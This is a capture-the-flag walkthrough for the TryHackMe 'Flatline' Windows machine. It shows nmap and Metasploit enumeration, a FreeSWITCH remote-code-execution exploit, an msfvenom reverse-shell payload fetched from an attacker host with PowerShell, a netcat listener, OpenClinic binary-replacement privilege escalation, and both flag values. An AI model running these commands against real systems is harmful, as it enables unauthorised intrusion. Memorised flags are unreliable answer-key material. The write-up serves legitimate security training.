## Flatline


1. Enumerate with nmap. We see that port 3389 is open and is running the service `ms-wbt-server`, which is RDP. We also see that port 8021 has Freeswitch running
```
$ sudo nmap -Pn -sS -A 10.10.122.186
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 13:42 EST
Nmap scan report for 10.10.122.186
Host is up (0.22s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
|_ssl-date: 2022-03-07T18:42:40+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-03-07T18:42:39+00:00
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   89.27 ms  10.13.0.1
2   ... 3
4   236.73 ms 10.10.122.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.21 seconds
```

2. Use metasploit's `scanner/rdp/rdp_scanner` module to scan the machine for any RDP vulnerabilities. We see that it requires [NLA (Network Level Authentication)](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-allow-access), so there's not much we can do with RDP
```
msf6 auxiliary(scanner/rdp/rdp_scanner) > exploit

[*] 10.10.122.186:3389    - Detected RDP on 10.10.122.186:3389    (name:WIN-EOM4PK0578N) (domain:WIN-EOM4PK0578N) (domain_fqdn:WIN-EOM4PK0578N) (server_fqdn:WIN-EOM4PK0578N) (os_version:10.0.17763) (Requires NLA: Yes)
[*] 10.10.122.186:3389    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

3. Search for any freeswitch vulnerabilities to find this [python script](https://www.exploit-db.com/exploits/47799). Run it with `python3 <script name> <ip address> <command>` and we see that it works.
```
$ python3 freeswitch_rce.py 10.10.122.186 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```

4. Create a payload with msfvenom `msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip address> LPORT=4444 -f exe > payload1.exe`. Then create an http server to serve the payload `python3 -m http.server`. Set up a netcat listener with `nc -nvlp 4444`. Finally, download and invoke the payload on the target machine with `python3 freeswitch_rce.py <target ip address> "powershell.exe Invoke-WebRequest -Uri http://<attacker ip address>:8000/payload1.exe -OutFile ./payload1.exe && .\payload1.exe"`

5. After getting the shell, look around and find both user.txt and root.txt in `C:\Users\Nekrotic\Desktop`. Using `more user.txt` gives us `THM{64bca0843d535fa73eecdc59d27cbe26}`. We can't view root.txt because we have insufficient permissions.

6. After doing some more enumeration we get to `C:\Users\Administrator\Desktop` and find two files. OpenClinic seems to be another piece of software that is installed on the pc. After doing some digging we find that OpenClinic has a [vulnerability](https://www.exploit-db.com/exploits/50448) that lets us escalate our privileges. 
```
09/11/2021  07:18    <DIR>          .
09/11/2021  07:18    <DIR>          ..
08/11/2021  18:24       108,048,384 FreeSWITCH-1.10.1-Release-x64.msi
08/11/2021  06:05       413,584,335 OpenClinicSetup5.194.18_32bit_full_fr_en_pt_es_nl.exe
               2 File(s)    521,632,719 bytes
               2 Dir(s)  50,541,469,696 bytes free
```

7. Follow the guide precisely: rename the original mysqld.exe binary, create your own reverse shell binary (make sure to use a port that isn't already being used), server it to the target machine with the http server, rename it to mysqld.exe, start a listener on the port with netcat, and then restart the target machine with `shutdown /r /t 1`

8. Once we get a shell, print out the root.txt file to get `THM{8c8bc5558f0f3f8060d00ca231a9fb5e}`
